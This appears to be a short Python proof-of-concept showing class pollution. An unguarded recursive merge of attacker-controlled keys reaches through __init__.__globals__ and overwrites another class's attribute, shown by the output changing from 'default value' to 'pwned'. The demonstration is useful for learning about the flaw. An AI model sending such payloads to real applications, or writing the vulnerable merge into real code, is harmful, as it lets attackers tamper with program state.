def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, "__getitem__"):
            if dst.get(k) and isinstance(v, dict):
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and isinstance(v, dict):
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


class Foo:
    # this pollution requires at least one function defined in the class
    def __init__(self):
        pass


class Bar:
    MY_ATTR = "default value"
    pass


payload = {"__init__": {"__globals__": {"Bar": {"MY_ATTR": "pwned"}}}}

foo = Foo()
bar = Bar()
print(bar.MY_ATTR)  # default value

merge(payload, foo)

print(bar.MY_ATTR)  # pwned
